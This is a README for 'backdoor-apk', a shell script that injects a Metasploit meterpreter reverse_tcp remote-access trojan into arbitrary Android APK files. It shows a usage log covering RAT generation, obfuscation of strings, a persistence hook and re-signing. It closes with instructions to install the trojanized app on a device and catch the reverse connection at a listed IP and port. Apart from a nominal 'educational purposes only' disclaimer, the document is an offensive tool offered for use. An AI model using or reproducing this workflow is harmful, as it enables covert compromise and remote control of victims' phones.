# backdoor-apk
backdoor-apk is a shell script that simplifies the process of adding a backdoor to any Android APK file. Users of this shell script should have working knowledge of Linux, Bash, Metasploit, Apktool, the Android SDK, smali, etc. This shell script is provided as-is without warranty of any kind and is intended for educational purposes only.

Usage:

```
root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk 
[*] Generating RAT APK file...done.
[+] Using payload: android/meterpreter/reverse_tcp
[+] Handle the reverse connection at: 10.6.9.31:1337
[*] Decompiling RAT APK file...done.
[*] Decompiling original APK file...done.
[*] Merging permissions of original and payload projects...done.
[*] Running proguard on RAT APK file...done.
[*] Decompiling obfuscated RAT APK file...done.
[*] Creating new directories in original project for RAT smali files...done.
[*] Copying RAT smali files to new directories in original project...done.
[*] Fixing RAT smali files...done.
[*] Obfuscating const-string values in RAT smali files...done.
[*] Locating smali file to hook in original project...done.
[*] Adding hook in original smali file...done.
[*] Adding persistence hook in original project...done.
[*] Recompiling original project with backdoor...done.
[*] Generating RSA key for signing...done.
[*] Signing recompiled APK...done.
[*] Verifying signed artifacts...done.
[*] Aligning recompiled APK...done.
root@kali:~/Android/evol-lab/BaiduBrowserRat#
```

The recompiled APK will be found in the 'original/dist' directory. Install the APK on a compatible Android device, run it, and handle the meterpreter connection at the specified IP and port.


Tutorial:
https://www.youtube.com/watch?v=m3v2YNiiNKY
